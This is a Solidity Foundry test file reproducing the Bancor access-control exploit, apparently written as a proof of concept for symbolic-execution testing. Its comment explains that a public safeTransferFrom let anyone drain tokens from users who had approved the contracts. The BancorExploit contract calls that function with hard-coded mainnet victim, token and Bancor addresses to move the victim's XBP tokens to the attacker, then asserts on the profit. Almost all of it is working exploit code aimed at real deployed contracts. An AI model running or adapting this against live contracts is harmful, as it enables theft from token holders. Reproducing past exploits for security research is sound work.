// SPDX-License-Identifier: UNLICENSED
// pragma solidity 0.8.10;

import "forge-std/Test.sol";
// import "./../interface.sol";

/*
Bancor Protocol Access Control Exploit PoC

Some of the newly deployed Bancor contracts had the 'safeTransferFrom' function public.

As a result, if any user had granted approval to these contracts was vulnerable.

The attacker can check if an user had granted an allowance to Bancor Contracts to transfer the ERC20 token 

Example tx - https://etherscan.io/tx/0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f
*/

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IBancor {
    // from is victim
    function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
}

// victim's slot is:
// Loading from addr LitAddr 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40 slot Lit 0xab39bd4ed4f120ab16b799b542a9f20cadc701e31bfb4bc86052bf201b781ebc
// Fetching slot 0xab39bd4ed4f120ab16b799b542a9f20cadc701e31bfb4bc86052bf201b781ebc at 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40

contract BancorExploit is Test {
    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
    address attacker = address(this);
    IERC20 XBPToken = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);

    IBancor bancorContract = IBancor(bancorAddress);

    function setUp() public {
        // vm.createSelectFork("mainnet", 10_307_563); // fork mainnet at 10307563
    }


    function test_attack_symbolic(uint256 _symbolicAmount) public {
        // XBPToken.balanceOf(victim);
        uint256 balBefore = XBPToken.balanceOf(attacker);

        // vm.prank(address(this));
        bancorContract.safeTransferFrom(
            IERC20(address(XBPToken)),
            victim,
            attacker,
            _symbolicAmount // Use symbolic parameter
        );
        
        uint256 balAfter = XBPToken.balanceOf(attacker);
        uint256 profit = balAfter - balBefore;
        
        uint256 TARGET_PROFIT = 905987977635678910008152;
        
        assert(!(profit >= TARGET_PROFIT));
    }
}
